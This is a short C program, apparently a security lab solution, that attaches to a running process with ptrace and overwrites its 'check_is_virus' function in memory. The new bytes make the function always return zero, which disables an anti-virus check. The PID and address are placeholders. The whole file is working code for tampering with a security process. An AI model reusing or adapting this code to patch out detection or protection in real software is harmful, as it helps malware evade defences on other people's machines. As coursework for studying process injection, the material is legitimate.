#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>


unsigned ANTI_PID = 0x12345678;
// int ANTI_PID = 4354;
unsigned CHECK_VIRUES_MEM = 0x87654321;
// int CHECK_VIRUES_MEM = 0x080485f0;


int main() {
	int pid = ANTI_PID;
	int check_virus_replace = 0xc390c031; // opcode for "xor eax, eax; nop; ret;"
	if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {  // Attach to the process
	  perror("attach");
	  return -1;
	}

	int status;
	waitpid(pid, &status, 0);  // Wait for the process to stop
	if (WIFEXITED(status)) {  // Abort if the process exits
		return -1;
		}

	// Do your magic here

	// replacing the content of the function check_is_virus with the following assembly:
	// "xor eax, eax; nop; ret;"
	// nop is used to align our content to an exact word (4 bytes on this machine)
	unsigned code = ptrace(PTRACE_POKEDATA, pid, CHECK_VIRUES_MEM, check_virus_replace);
	if (code == -1){
		perror("poke data");
		return -1;
	}

	if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1) {  // Detach when done
	  perror("detach");
	  return -1;
	}

    return 0;
}
